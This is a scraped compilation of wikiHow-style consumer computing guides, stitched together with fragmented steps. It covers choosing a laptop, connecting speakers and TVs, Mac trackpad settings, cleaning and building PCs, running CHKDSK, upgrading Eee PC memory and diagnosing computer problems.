Go with what you know. If you're used to one OS it'll be easier to continue with a familiar interface than give something new/fresh a chance. But don't let your first OS decide every subsequent OS and computer you buy.

, If you use a lot of Microsoft Office products, you’ll find the best compatibility with a Windows computer. This doesn’t mean you can’t use on the other operating systems, there’ll just be a few more hoops you’ll have to jump through. Conversely, if you’re doing music production or photo editing, you’ll find the most powerful programs on a Mac.


Windows supports the most video games by far, though support for both Mac and Linux is increasing.
If you are inexperienced with computers and will need help, buy the type of computer that helpful family members or friends know and will help you with. Otherwise you'll have to rely on call-center 'tech support'.

, Some laptops can be purchased with Linux pre-installed. You can try Linux on your current machine by using a LiveCD. This allows you to run the Linux operating system without having to install it on your computer.


Most Linux operating systems are free of charge as are thousands of programs and apps. A program named WINE lets you run many Windows programs on Linux systems. You can install and run these applications just like you would in Windows. WINE is still under active development, so not every program works yet. However there are several million people using WINE to run their Windows software on Linux operating systems.
Linux has virtually no threats from viruses. Linux is the perfect choice for children because the operating system is free, the programs are free, and there is virtually no threat of viruses. If the kids mess the operating system up just reinstall the operating system and start over fresh. Linux Mint looks and works the most like Windows. Ubuntu Linux is the most popular.
Linux requires the most technical experience to get the most out of it. You will need to be familiar with command lines, but almost everything you need to know can be looked up online.
Not all hardware is compatible with Linux, and you may have difficulty finding drivers that work.

, Mac computers are a fundamentally different experience than Windows computers, so if you’re making the transition it can be easy to get lost. Mac touts a very user-friendly interface, and is a powerful media production operating system.


Macs connect seamlessly with iPhones, iPods, iPads, and other Apple products. Apple Support is also very comprehensive for new Apple products.
Macs are less prone to viruses than a Windows PC, but you still need to be wary.
Windows can be emulated on a Mac computer using Boot Camp. You will need a valid copy of Windows to do this.
Macs are typically higher-priced than their Windows or Linux counterparts.

, Windows netbooks/laptops can be quite affordable, and there are many options from a number of manufacturers to fit virtually every need or want. If you haven’t used Windows in a while, you’ll notice things look quite different now. Windows 8 has a Start screen not only with your programs, but also with ""live tiles"" such as the latest news and sports instead of the old Start menu. Internet Explorer 10 includes a feature that can scan a file for possible viruses and malware before a user downloads it.


Unlike Macs, Windows machines are manufactured by a wide variety of companies. This means that the quality will vary from laptop to laptop. It's important to look at what each manufacturer offers in terms of price, features and support, and then to read reviews and other sources for information on how reliable the manufacturer's products are.
Windows laptops usually offer many more customizable options over a Mac laptop.

, Besides the three main operating system choices, there are a few other options out there. One of the most popular, and growing, options is a Chromebook. These laptops run Google’s ChromeOS, which is completely different than any of the options above. These laptops are designed to be constantly connected to the internet, and come with subscriptions to online storage with Google Drive.


There are only a few different models of Chromebook available. HP, Samsung, and Acer each make a budget model, while Google makes the more expensive Chromebook Pixel.
ChromeOS is designed to run Google web apps such as Chrome, Google Drive, Google Maps, and more. These laptops are best suited for users who are already heavy Google users.
Chromebooks will not be able to run any programs designed for another operating system, including most games and productivity programs.

, Try out as many different operating systems as you can in the store or on friends' computers. See what feels most innate and natural to your way of using a computer. Even within the same operating system, keyboards, track pads, etc., can feel very different under your personal touch.

, There are three different size/weight ranges for a laptop: a netbook, a laptop, or desktop replacement. Although all of these fall into the broader concept of a ""laptop"", their end usability differs and can impact your choice.


There are several important things to consider when it comes to laptop size: Weight, screen size, keyboard layout, performance, and battery life. You will typically find netbooks to be the cheapest yet smallest of the choices, while regular laptops will need to strike a balance between all of the factors that suits your needs.
Portability is a major concern for laptops. Getting a larger screen will sacrifice weight and portability. Consider the size of your bag when looking at different laptops.

, Netbooks, also known as a mini notebooks, ultrabooks, or ultraportables, are small laptops with a portable small screen of 7""-13""/17.79 centimeter (7.0 in)-33.3 centimeter (13.1 in). This has a compact size, is light in weight, and is usually suitable for emailing and browsing or light internet usage as their memory is small. Since netbooks tend not to have as much RAM as laptops, their ability to run sophisticated applications is limited.The keyboard for netbooks will be significantly different than that of a standard-sized laptop. Make sure to give it a try before committing, because typing will feel odd for a while.
Many tablet hybrids are now available. These come with detachable or flip-over keyboards, and usually have a touch screen. Consider these if you find yourself needing a tablet but can’t afford an iPad.

, These have a screen size of 13""-15""/33.3 centimeter (13.1 in)-38.1 centimeter (15.0 in). They are of medium weight, thin and light, and are able to hold a lot of memory. The decisions to make about a laptop's capacity really come down to your own preference as to screen size, and the amount of RAM you think you'll need (See next section).


Laptops come in all shapes and sizes. As technology improves, they are becoming slimmer and lighter. You will find that Mac laptops don’t necessarily match up to these size descriptions. If you have decide on a Mac, consider your portability needs when looking at different models.

, These have a screen size of 17""-20""/43.8 centimeter (17.2 in)-50.8 centimeter (20.0 in). These are larger and heavier, have full features, and tend to be bound for the desk rather than being lugged around in your backpack. While not as portable as the other two, it's still very mobile when needed and the added weight when carrying it isn't really a big issue for many people. If you're not sure about this size, weigh up your desk and portable needs.


Some desktop replacement laptops have the ability to upgrade to a limited extent, allowing you to install a new video card.
These laptops are the most suitable for gaming enthusiasts.
Larger laptops will typically have a much shorter battery life, especially if you are running intensive programs such as video games or graphic development.

, Decide on whether you'd prefer a metal or plastic exterior. Nowadays the choice of casing is mostly an issue of personal preference, as the weight of each outer-casing is fairly similar, with well-made metallic laptops being no heavier than plastic ones. In terms of durability, metallic casing is probably best for a laptop liable to get knocked around a bit but it's still best to ask your retailer for advice.


If you are doing fieldwork or a lot of ""rough travel"" with a laptop, you might need customized extras to protect it. Ask for a stronger screen, shock mounting of internal components, and protection against water and dirt.
If you are a professional in the field and you really need it to last then there is a class of laptops called Toughbooks, which tend to be quite expensive, but you can run them over with a truck or bake them in the oven without damaging them.
Most consumer model laptops in retail showrooms are not built for durability. Look for a corporate model laptop built from metal or composite materials if durability matters.

, Laptops by their nature are very public devices. Much like watches, purses, sunglasses, or any other accessory, laptops have style. Make sure the laptop you want isn’t one that you would consider ugly, or you might be less likely to use it on the go., When you buy a laptop, you are typically stuck with the hardware that’s inside. This means that you want to be extra sure that the laptop has the specifications that you need.

, Higher end, faster processing laptops will have a multi-core CPU such as Intel, AMD, and now ARM. These won't usually be found in netbooks or lower-end laptops. The difference impacts the speed of your laptop's performance.


As technology moves forward, older processors quickly get left in the dust. If you’re buying Intel, avoid Celeron, Atom, and Pentium chips, as these are all older models. Instead, look for the Core i3 and i5 CPUs. If you are buying AMD, avoid the C- or E-series processors and instead look for the A6 or A8., Consider how much RAM you actually will need in your new unit. The amount of RAM memory can be an important spec to consider. Often the amount of memory can limit the applications that you can run. Large applications will require more memory to run. In general, the more memory you have, the faster the laptop will run.


Most standard laptops typically come with 4 gigabytes (GB) of RAM. This is usually sufficient for most users. Netbooks may come with as little as 512 megabytes (MB), but this is becoming less common. You can find laptops with 16 GB or more, though this is only recommended if you are running multiple memory-intensive programs.
While it may be tempting to get a whole ton of RAM when you purchase the laptop, often retailers will put massive amounts of RAM in a unit to disguise the fact that the rest of the components are sub-par (slower processor, etc). Since it is quite easy to upgrade RAM, this should not be a huge consideration for a specific laptop.

, If you are playing games, check the graphics memory. You should have a graphics card with discrete video memory for 3D games, though this is not necessary for most casual games. A discrete graphics card will consume more battery power as well.

, The listed size of the hard drive will be a little misleading, since it does not take into account the operating system and any pre-installed programs. Often, you will have about 40 GB less than the listed amount available.


Alternatively, Solid State Drives (SSDs) offer much higher performance, no noise and extended battery life, but have much smaller capacities (usually 30GB to 256GB at the time of writing) and cost more. If you are looking for the best possible performance, an SSD is a must, but you'll probably need to purchase an external hard drive for things like music, photo and video libraries.

, How many USB ports are in place for adding your peripherals? If you plan on using a separate keyboard and mouse, you’ll need at least two spare USB ports. You’ll also need ports for printers, external drives, thumb drives, and more.


If you want to connect your laptop to your TV, make sure that it has an HDMI port for the best possible connection. You can also use a VGA port or DVI port to connect to the TV.

, If you want to be able to burn CDs and install software from discs, you will need a DVD drive. If your laptop does not have one, you can always purchase an external DVD drive to plug in when needed. Blu-ray drives are also options now in many laptops. If you want to be able to play Blu-ray movies, make sure you choose a Blu-ray drive (sometimes called BD-ROM) instead of a DVD drive.

, The higher your resolution, the more content you can fit on your screen. Images will be crisper on a higher resolution as well. Most mid-range laptops come with a resolution of 1366 x 768. If you are looking for a crisper picture, find a laptop with a 1600 x 900 or 1920 x 1080 display. These are often only available on the larger-sized laptops.Ask how the laptop screen performs under sunlight; cheaper screens will often be ""invisible"" in outdoor light, making their ""portability"" a little less useful for you.

, Your laptop should be Wi-Fi enabled. Virtually all laptops have wireless cards built-in, so this usually isn’t a concern anymore.

, Whether you’re buying from a store or online, you’ll want to make sure you know as much as possible about the laptops you’re interested in or the specs you need. This will help you know what kind of deals you’re getting and will prevent you from being led astray by ill-informed salespeople.


If you’re going into the store, have a printout of the laptop(s) you’re interested in, or have the information available on your phone. This will help you narrow the field and keep you focused on what you need.

, There are a variety of places you can purchase laptops from these days. From big box stores to mom-and-pop computer shops, or from Craigslist to Amazon, there are a huge number of outlets available, all offering different prices and levels of service.


The big stores or specialized computer stores are the best way to try multiple laptops before you buy them. If you’re planning to buy online, go down to your local computer/electronics store and try out a few different models, and then take your notes back home.

, Almost all laptop manufacturers offer a warranty for their products. This warranty may vary, and some stores will offer additional warranty coverage for more money. On the flip side, if you’re buying used off of Craigslist, it’s highly likely that the laptop is no longer covered.

, It is very important that the laptop comes with a good warranty and from a reputable dealer. Durable, corporate grade laptops can be a bargain when refurbished. The risk is that the laptop has been mistreated and is in poor condition. If the price is right, and especially if there is a one year warranty, then the risk may be negligible.


Don't buy discounted floor stock laptops unless they come with a good warranty from a reputable dealer. It’s likely that these have been powered up all day every day, as well as being exposed to store dust, grimy fingers, and endless pressing and banging from bored kids or confused customers.

, While it depends on the brand and type of laptop, a laptop that is cared for well should last a good few years before you need to invest in another laptop. Taking the time to clean and maintain the laptop will keep it running smoothly for years.

",How to Connect Speakers to Your Laptop2," If the right side of the Hardware screen shows any sort of device information (such as “Apple Bluetooth Software Version 4”), you have Bluetooth.
In Windows, press ⊞ Win+X and select “Device Manager.” Click “Laptop.” If you see a category under Laptop called “Bluetooth Radios,” click it to expand a list of Bluetooth devices. If anything appears in this list, you have Bluetooth.

, Some things to keep in mind:


The speakers will need to be plugged into a power source.
Having a wall between the laptop and the speaker shouldn’t affect the connection too much, but it can potentially decrease sound quality.
If you want to be able to turn the speakers on and off easily, you may not want to mount them in a difficult-to-reach location.
Check your speaker manual to find out how close your laptop must be to your speakers.Typically these speakers can be up to 30 feet away, but some devices may have lower ranges.

, This process is different depending on the manufacturer of your speakers. Often there is a button on the speakers that must be held down for a few seconds to put the device into “discovery” mode. Check your manual to be sure.

The type of port you have will determine the types of connectors you can use. There are four main types of connector ports, listed from the most current to the most outdated:HDMI - This port is about the same size as a USB port, with indents on each side. It is indicated by the letters ""HDMI"". If you have this port, you don't need any special adapters; you can just plug an HDMI cable into the port and into your TV.
Thunderbolt - This is a port that is slightly smaller than a USB port and is indicated by a small lightning bolt icon.
Mini DisplayPort - This port is shaped the same as a Thunderbolt port and is indicated by a rectangle with a straight line on each side.
Micro-DVI - This port is slim like a USB port, with a small indent on each side. It is indicated with the same icon as the Mini DisplayPort.;
, If you have a Thunderbolt port, you can use either Thunderbolt or Mini DisplayPort adapters. If you have a Mini DisplayPort, you can only use Mini DisplayPort adapters. If you have a Micro-DVI port, you can only use Micro-DVI adapters., Before purchasing an adapter for your MacBook, you'll want to check what connections your TV supports.


Most modern TVs support HDMI. This connection will allow you to transfer both image and audio.
If you don't have HDMI, the next best option for high-quality image is DVI. DVI connections do not transfer audio, however, so you'll need a separate audio connection.
If you are connecting to a particularly old TV, the only option you may have is a composite adapter. These can be difficult to find these days.

, To make the connection, you will need an adapter that converts your MacBook's connector to your TV's connector. If your TV supports HDMI, you'll want a Thunderbolt/Mini DisplayPort to HDMI adapter. If your TV only supports DVI, you'll need the Mini DisplayPort to DVI adapter.


If you have an HDMI port on your MacBook, you don't need an adapter (as long as your TV supports HDMI as well).

, Besides the adapter, you'll need a cable to connect the adapter to your TV. If you are using an HDMI adapter or have an HDMI port, use an HDMI cable. If you are using a DVI adapter, use a DVI cable.


If you are using DVI, you'll also want an analog audio cable to transfer the audio signal.

, Plug your adapter into the correct port on your MacBook.

, Use your video cable to attach the adapter to your TV.

, Make sure you choose the correct one, as some TVs have multiple HDMI or DVI ports. By default, you should see your desktop extended onto the TV automatically.

, You can find this by clicking the Apple menu.

, This menu will allow you to adjust your screen positioning and mirroring options.

, This will allow you to change several options regarding your display positions.

, The icon looks like a box with three gears inside it. Open that to find all your system preferences.


Alternatively, you can use the Spotlight feature. Just click on the magnifying glass icon in the top-right corner of your screen, right next to the clock, or use the hotkey function: the command button and the space bar.

, Click on the name to bring up the system preferences folder.


System Preferences is organized into parts and have helpful icons to help you find what you are searching for: Personal, Hardware, Internet & Wireless, System, and Other.

, The settings we need are located under the Hardware area; six icons to the right will be the trackpad settings. The icon is a gray box meant to resemble the trackpad.


If you want to bypass the System Preferences search, you can Spotlight for “Trackpad.” It will show up in the System Preferences highlight.
The most useful thing for these settings is that each bit that you can toggle or untoggle comes with a little video to the right of the option, showing you physically how to use this setting on your computer. If you are unsure if you want to use an option, hold your mouse over it and watch the little instructional video that will autoplay and replay.

, In the System Preferences window, the mouse settings are fifth to the right in the Hardware area, right before trackpad. Its icon is a little computer mouse.


If you want to bypass the System Preferences search, you can Spotlight for “Mouse.” It will show up in the System Preferences highlight.

, Under the Trackpad settings, make sure you are in the Point & Click tab. There are four options and a track speed slider included here.


The Macbook Pro’s trackpad has two clicking options. Pressing down works like a button; your trackpad will click and feel as if you pressed a button. This is how you can click, but there is an option to simply tap lightly on the trackpad instead. If you want this option, look to see if it has been toggled (a blue check mark would be in the box next to it).
The second option is called Secondary Click. This is similar to right-clicking. You can use the default option of just two fingers or a special option, which is offered in a drop-down box. The video on the right will show you how to use this option.
The Look Up option is useful for when you need to define a certain word on a site. You hover over the word and tap three fingers at once to bring up the dictionary term.
Three-finger drag is useful for quickly moving windows around on your screen while you are working. If you decide to use it, remember your cursor has to be on the window you want to move, and it must be a currently selected window.
Tracking speed is how fast the cursor follows your movements. It’s suggested to adjust the speed, as you feel necessary. Everyone is different—some like the cursor to be slower than their fingers, some like it to move faster than their fingers. Test a few speeds and adjust to how you feel.

, Four options are available in this setting bit. if you want to keep these options for your trackpad and either toggle them (have a blue check mark to the left) or untoggle them.The second tab in the Trackpad settings is the settings for scrolling and zooming on your Macbook. These are the most known settings for the Apple industry since they work on the iOS systems as well.


Scroll direction: natural—This is how you scroll contents by using the trackpad instead of holding the scroll bar and moving it on a screen that is too long to fit on your monitor.
The default scrolling is actually the opposite of a PC; the contents move with your fingers. Two fingers touch the touchpad, and by sliding them up, the content page moves upward, allowing you to see further down the page. By sliding down, the content scrolls down, letting you go back to the top of the page. If you untoggle this, it reverses itself.

, To zoom in, place two fingers together on the trackpad and slide them apart. For zooming out, pinch together two fingers.


Another way to zoom is to use Smart Zoom, which is the second option given. Simply tap twice with your two fingers at the same time, and it will automatically zoom in. You can have better control with the zooming in and out with pinching your fingers on the trackpad.
Usually meant for photo-editing, the Rotate function allows you to rotate a picture just by the twist of your fingers on the trackpad. With two fingers, you can turn a picture to the right or left by rotating your fingers while touching the pad.

, This last tab has many different options to adjust your trackpad to your desire, like being able to swipe between pages or full-screen apps, to bring up elements of your laptop such as the Notification Center, Mission Control, Launch Pad, and Desktop.


Use the App Expose so you can see all the currently open application windows. These work with three to four fingers, sometimes using the thumb for the ones where you pinch or spread your fingers (Notification Center only needs two fingers).
Some of these options have extra choices where you can change the finger command. It’s recommended that you go over the video of each option so you can make the best judgment to whether you want the option enabled or not.

, Under the Mouse settings, you can change the direction of the scroll. The natural option will be how the Macbook defaults the scrolling moves with your fingers—sliding downward moves the content up, so you can get to the bottom of the page, and sliding up brings you to the top of the page.


Untoggle this if you want the opposite actions.
In Trackpad settings you should have edited the Tracking speed, but you can also change the setting on this screen as well with the slider bar. If you are going to change this, make sure you move the mouse around so you know if you’re comfortable with it or not before exiting.
You can also change how fast your computer will scroll a page with your fingers. Bring up a page that has a scroll bar when you are editing this so you can test out the speed of the scrolling so you can set it to your preference.

, Slower speeds allows you to click things slower and still have them open. You shouldn’t have to mess with this sliding bar too much.


It’s recommended that you don’t change the Primary mouse button either. Changing it to Right would cause you to right-click everything instead of left-clicking. This setting is mostly for when you are using an Apple mouse and not the trackpad.
All your settings should save automatically, and when you feel comfortable, you can quit System Preferences by going up to the toolbar at the left top, next to the Apple icon. Select System Preferences and click the Quit System Preferences to close the program.

Power Plug: This is an important part that is charged by plugging it into a power outlet. The power cord is attached to the power adapter on a small square that is sometimes difficult to take out. The power plug is very thick.

Power Cord: This part of the power adapter is secured in the middle of the two flaps which is then used to charge on the side of the computer. The power cord is thin and long.

Flaps or Wings: The flaps are a neat design feature placed on the power adapter. Have you ever noticed the charger is really long? The flaps are used to either wrap the power cord or plug around the flaps so it won't be annoying carrying a long charger across the floor.;

Before prying keys off, make sure you understand how to replace them. Some laptop keys are harder to reassemble than others. If you're not sure, try popping off one key and replacing it before you pop them all off.

, Place the keys from the keyboard inside of the bowl and let them sit for as long as necessary to loosen the gunk. You may need to scrub the keys lightly by hand to finish the job.

, Dip a lint-free cloth in the new cleaning solution. Wring out the cloth to avoid dripping water. Wipe clean the inside of the keyboard, as well as the sides and the other faces of your laptop.

, Use the compressed air again (remember to keep the can upright). Spray all of the connector ports until they are nice and clean.

, Do not shut the lid. If you removed the keys from your keyboard, you can set them out on the counter or table or wipe them with a dry cloth.

,, Spray some onto a microfiber cloth and gently wipe it over the screen. Shake out the cloth to get rid of dust and grit, then apply more cleaning solution to a clean part of the cloth and go over the screen gently. Do not use a lot of pressure while cleaning the screen.

",How to Build a Scrap PC," Often you can salvage undamaged parts from a recent-vintage PC, as long as you are very careful to avoid static discharge. (Touching a piece of conductive metal every once in a while should do the trick). From older PCs, you may only be able to salvage the case and the PSU. Many old motherboards have the CPU built in.;
, If you're planning to use a new motherboard and an old hard drive, you may have to get an IDE controller adapter card (if your motherboard has an empty PCI express slot). You can probably grab one at Newegg for $20. Also check if the CPU and the motherboard use the same socket (such as AMD FM2 or Intel LGA1155). Make sure your PSU has enough watts for all of your computer parts. Check if your motherboard supports the type of RAM you're using. New motherboards tend to use DDR3 RAM while older ones tend to use DDR2.

, For parts installation, you could watch a video or read the motherboard's manual (if you have it). Carefully remove the motherboard and set it on a non-conductive surface.


If you have a CPU cooler (a good thing to have), you will have to read the instructions on how to install this part, since AMD and Intel vary.

, Make sure you do not touch the pins on the bottom. Lift the lever on the processor socket, align the golden arrow on the corner of the processor with the golden arrow on the socket. Carefully put the CPU in place and pull the lever down to lock it in place.

, Pull the two clips on the RAM sockets down. Then align the RAM with the socket and firmly press the RAM in place. The clips should snap in.

, Before you mount the motherboard into the case, you should mount the PSU, place the optical drive in 5.25 bay, and place the hard drive into the the hard drive bay. Installation may vary with model.

, Push it into place in the rectangular opening in the case.

, To know where to place the standoffs, put the motherboard on a piece of paper and put dots where there are holes in the motherboard.

, Screw the motherboard screws into the standoffs.

, Screw the cards into the back of the case.

, Plug the wires from the case into the plugs on the motherboard.

Measure the surface area around your computer keyboard.,Go to the hardware store

,
Track down a sheet of plexiglass (plastic window pane).,
Go to the 'hardware' section (where screws, hinges, knobs & things are) and track down sticky rubber feet.,Lay the plastic sheet out on top of your keyboard

,
Mark wherever you'll cut or stick things with a grease pencil or dry erase marker.

,
If necessary, due to a notebook stand or other obstruction, or to access certain controls, outline where you'll need to cut/drill convenient finger-size big holes, such as for a power button.,
Support the sheet thoroughly before drilling, such as by drilling into a piece of scrap wood under the plexiglass sheet, or you'll crack it like I did with my first try.,
Now that the cutting is done, remove the sticky plastic.,
Now bring it back and stick the rubber 'feet' on the lucite.,
The stand-offs also let air circulate.",How to Cat Proof Your Notebook Keyboard,";
,, For a $6 project, get plexiglass, and for a $20 get 'lexan'. Home Despot sells it in almost the perfect size somewhere around their window section. It can be a little smaller than the computer, or even a little bigger than the computer, but not much smaller than the keyboard area with a half inch all around. They also sell a plastic cutter for $4, if you need one.

, The ones I found were called '1/2"" Vinyl Bumpers', but anything that is self adhesive on one side, and grippy on the other for putting on the bottom of things, and adds a little height will do fine.

,,, If you'll need to cut it, don't remove the sticky plastic covering until after you've trimmed or drilled it.

, Normal wood-working drill bits and circular saws work OK, or even 'dremel' bits, though you might want a 'fine' bladed saw blade, or one made for plastic. If you have a jigsaw, get a plastic blade.

, You'll probably want to sand down any rough edges when you're done cutting/drilling/etc.

, Since it's clear, just hold it over the keyboard and stick the feet everywhere around the keyboard and mouse pad, as close as you can get them to the keyboard, but not over any keys. Make the sheet as stable as possible. You're trying to keep the cat from pushing the buttons. If the cat lays down and dislodges the sheet, buttons will probably be pressed. You can generally 'eyeball' where you will put the feet, but keep in mind that they don't usually peel off 'cleanly' if you make a mistake. Most of them can be placed for vertical accuracy by putting them where they go, then flipping it, but for horizontal accuracy around track pads or between segments of keyboard, you'll want to put something on the plastic like a bit of masking tape to show where it will go.

, If there still isn't enough circulation (the notebook gets warmer than usual), take the sheet out and drill lots of air holes in it, once again, making sure it's supported (i.e. on top of a piece of scrap plywood). Lay it on a piece of newspaper to protect it from scuffs. Or use bigger spacers.

Access the CHKDSK utility.,
Decide on a basic versus an advanced scan.,
Reboot the computer to begin the scan.,
Use the alternate CHKDSK utility access.,
Open the command prompt.,
Type “chkdsk /f x:” into the command prompt.,
Wait for the scan to complete.",How to Fix a Cyclic Redundancy Check Error1," CHKDSK (or ""check disk"") is a built-in Windows utility that will scan and repair your drive's errors. It has the ability to find and repair a number of small errors or file corruptions that may be causing the cyclic redundancy error. Right click the drive you want to check, then click Properties->Tools. Under “Error Checking” click “Check Now”.


If a CD or DVD disc is giving you this error it may be the result of a scratch or some dust. Try cleaning the disk with a soft cloth before anything else.
Optical disk errors are often not repairable.
If you get this error on a Mac (less common), first try the built-in Disk Utility and “Repair” the disk.;
, Check boxes to indicate if you’d like to do a basic check and repair or an advanced one - the default is the basic scan.


The basic scan should take around 15-20 minutes while the advanced scan may take hours. Make sure you’ve got the time set aside and don't disturb the computer once it begins.

, If scanning the main drive on your computer (the one you’re booted up on), CHKDSK will not be able to run immediately and will instead schedule the scan for the next time you reboot the computer.


You can continue use the computer as normal at this point - restart when you know you have time for the full scan.
If you suspect your hard disk is nearing the end of its life, get your data backed up before running the scan. Even if some data is already inaccessible, backup everything you can just in case.

, Sometimes running CHKDSK via right click makes it unable to run the scan and repair properly. If the first scan doesn't fix the issue, try the alternate method of running CHKDSK.

, Find the program ""command prompt"" under Accessories.


Note that you must run CHKDSK commands as an administrator to have the necessary privileges to execute the scan.

, The letter “x” should be replaced with the letter name of the drive you’d like to run the scan on. Press enter.


The previous step gives the command for the basic scan. For the advanced scan type ""chkdsk /r x:” instead, where ""x"" is the letter name of the drive.

, Once finished CHKDSK will give you a report and restart your computer. If CHKDSK is able to fix the issue this is all you need to do.


If the /r repair seems to get stuck and never finish it (even if left overnight) is likely because you have many damaged files and CHKDSK will not be able to repair them. If this is the case, try the next method.
Over time your hard disk may develop minor file corruptions and other small errors through a number of different means. CHKDSK can fix many small issues but cannot address more serious problems.

Rescan your computer.",How to Fix a Cyclic Redundancy Check Error2," When CHKDSK isn't able to repair the issues with your hard disk, a 3rd party disk scan utility may be able to help. Popular options like HDDScan and SeaTools will provide an alternative to CHKDSK and may help solve the issue when CHKDSK fails. Many utilities offer different software versions for different operating systems (e.g. Mac OS vs PC/Windows)
Be wary of ""System cleaners' from disreputable sources. Look for established brands offering ""disk utilities""., Follow the instructions to run a scan on the drive that gave you the cyclic redundancy check error. The software should list all issues it finds in a short report.

, This process can run unattended, overnight. It's important to let the repairs run to completion, and depending on the state of your hard disk this repair could take more than 2 hours.


If the repairs still aren't completed after the scan has run for more than 4 hours, this is a sign of a failing hard drive. Cancel the scan and backup whatever data you can.

, This should only take a few minutes and will ensure that there are now no errors.

Prepare your Eee PC by placing it upside-down on a flat surface with some form of padding.,
Remove the battery.,
Open the memory cover on the back of the Eee PC.,
Remove the existing module.,
Unwrap the new module from its packaging.,
Install the new module.,
Verify the memory is recognized by your Eee PC.,
Replace the memory cover by snapping it into place and reinserting the screws.,
Get your Xandros operating system to utilize 2GB of memory.",How to Upgrade Memory in an Asus Eee PC," Search for standard, DDR2 laptop memory modules (not desktop memory), which will have 200-pin edge connectors. Select either a 1GB or 2GB DDR2 memory module of either 533 or 667MHz speeds. These may be referenced as PC-4200 or PC-5300, respectively. Recommended brands include, but are not limited to, Kingston, Corsair, Patriot, and Viking.;
, Also, unplug the AC power adapter.

, Keep the front of the laptop facing you. The Eee PC will need to rest on its top cover to replace the memory, so use a non-abrasive surface. For example, an over-sized mouse pad on your desk, a large piece of foam, or a clean, carpeted floor will work. Be sure to ground yourself or some surfaces may cause static to short a component.

, This will prevent you from accidentally shorting anything on the system board during this process. To remove the battery:


Use your left thumb to press and hold the left-most battery lock switch to the unlock position.
Use your right hand to click over the right-most battery lock switch to the unlock position.
Use your right hand to gently push the battery away from the laptop. Push a little at a time, alternating on each side. Newer Eee PCs and batteries may be a little tight at first.

,


If it exists, remove the Eee PC sticker covering one screw.
Completely loosen both screws with a Phillips #0 jeweler's screwdriver.
Remove the screws with your fingers and set them aside.
Use your finger and/or fingernail to pull up at the front of the cover. There should be a small slot here in the case to give you room to pry it open.
Keep pulling until the cover clicks open, then set it aside for now.

, This should be towards the front of the laptop, with empty space towards the back. It is held in with two metal clips on each side.


Use both of your thumbnails at the same time to press outward on the clips. The module will have a mild spring-loaded feeling to it. When the clips have been completely depressed on both sides, the module will push itself up at an angle.
Once the module is free of the clips, gently grasp the edge of it and pull out along the same angle in which it is resting. This is approximately a 15 to 25 degree angle to the laptop.
Put the module aside, in a safe, static-free location.

, Most memory will be sold in a piece of hard, clear plastic. Gently remove it from the packaging by pressing on it from the plastic side. Avoid bending the module or applying too much force to the packaging.

, Use your removal process as a guide in reverse for this installation.


At the same angle as before, insert the new memory module into the laptop's memory slot. Make sure it fits all the way down until the contacts are either no longer visible, or difficult to see. This requires almost no force, so be gentle.
Press down on the module to align it so that it is parallel with the laptop. The memory slot clips will click shut when the module is fully seated.

, Before closing up the memory cover, it is helpful to verify the memory is recognized by your laptop and its operating system.


Gently re-insert the battery
Flip over the laptop and power it on.
With Xandros — the default Linux distribution — click on the ""Settings"" tab.

Notice any graphics problems once the OS has loaded.,
Perform an auditory test.,
Check any newly installed hardware.,
Check any newly installed software.,
Check RAM and CPU consumption.,
Listen to the computer, if the hard drive is scratching or making loud noises, shut off the computer and have a professional diagnose the hard drive.,
Run a virus and malware scan.,
Check for the problem in safe mode.",How to Diagnose a Computer Problem," POST stands for Power On Self Test. This is generally the first or second thing that appears on a computer after turning on the power. This appears before the operating system begins to load. The POST will display any problems found with hardware that makes the computer unable to boot, POST may also display problems with hardware that allow the computer to boot, but not operate at its full capacity during operation.;
, A longer than usual load time may indicate seek errors (or other errors) in the hard drive.

, Reduced graphics may indicate driver failures or hardware failures with graphic cards.

, An auditory test is an unorthodox, but still effective way of judging how hard a computer is working. With the computer on and running, play any decent length audio file (usually above 30 secs). If the audio is choppy or slow, it usually means that the processor is working at an elevated level, or there is not enough RAM to run all programs loading. Changing the startup sound is a great way to apply this test. Another issue associated with choppy sounds is PIO (Programmed Input/Output) Mode. This affects how the hard drive reads and writes data from a drive. Switching to DMA allows for faster reads and writes, and can sometimes repair choppy audio.

, Many operating systems, especially Windows, can conflict with new drivers. The driver may be badly written, or it may conflict with another process. Windows will usually notify you about devices that are causing a problem, or have a problem. To check this use the Device Manager, this can be accessed by entering the Control Panel, clicking the System icon, clicking the Hardware tab, and clicking on Device Manager. Use this to check and arrange the properties of hardware.

, Software may require more resources than the system can provide. Chances are that if a problem begins after software starts, the software is causing it. If the problem appears directly upon startup, it may be caused by software that starts automatically on boot.

, A common problem is a choppy or sluggish system. If a system is choppy it is good practice to see if a program is consuming more resources than the computer can provide. An easy way to check this is to use the Task Manager, right click on the taskbar select Task Manager, and click the Processes tab. The CPU column contains a number that indicates the percentage of CPU the process is consuming. The Memory Usage column indicates how much memory a process is consuming.

, Listen to the CPU fan, this comes on a high speed when the CPU is working hard, and can tell you when the computer is working beyond its capacity.

, Performance problems can be caused by malware on the computer. Running a virus scan can unearth any problems. Use a commonly updated virus scanner (such as Norton Antivirus or Avast! Antivirus) and a commonly updated malware scanner (such as Spybot Search & Destroy).

, As a last ditch effort, check the problem in safe mode. To enter safe mode, tap F8 repeatedly during POST (this works on most systems). If the problem persists in safe mode, it is a fair bet that the operating system itself is to blame.

A garage or workbench is a good choice, or you can go outside if it's a dry day.


Try to set up a table so that you can easily access the computer without having to bend over or set it on the ground.;
, You will need a Phillips screwdriver, compressed air (either in a can or via a compressor), a small vacuum that can fit in narrow crevices, a toothbrush, and 99% isopropyl alcohol.


Do not use an old vacuum with a metal tip, as these are usually poorly grounded and can damage your components. The best option is a newer handheld vacuum with an extendable plastic hose.
The toothbrush should have soft bristles, and should be new.

, Shut down your computer and disconnect all of the cables on the back. Make sure that the monitor is unplugged, and that any USB cables, Ethernet cables, speaker cables, or anything else is unplugged as well. Flip the switch on the power supply and then remove the power cable.

, Place the computer on its side on your table or workbench. Make sure that the connectors on the back are laying closest to the surface. These connectors are attached to the motherboard, and can help you ensure that you remove the correct side panel.

, Remove the screws that hold the side panel in place. These screws can be found along the back of the computer. Most modern cases have thumbscrews that you can remove without tools, though you may need to use the screwdriver for older cases or thumbscrews that are too tight.


Set the screws aside so that you don't lose them.

, Depending on how long it's been and your environment, you could be greeted by a pretty gruesome sight. Dust has a tendency to collect and cake on your components, and the entire inside may be covered in a fine layer of gray. Use your vacuum cleaner to do a pass over the interior, sucking up the large bits of dust from the components and crevices.Be careful not to strike any of the components with the vacuum tip as you move it across the interior. Many components inside are very fragile, and bent pins and connectors can render your hardware useless.

, Take your can of compressed air or air compressor and blow out the hard to reach crevices. Use the vacuum to help reduce the amount of dust that scatters in puffs.


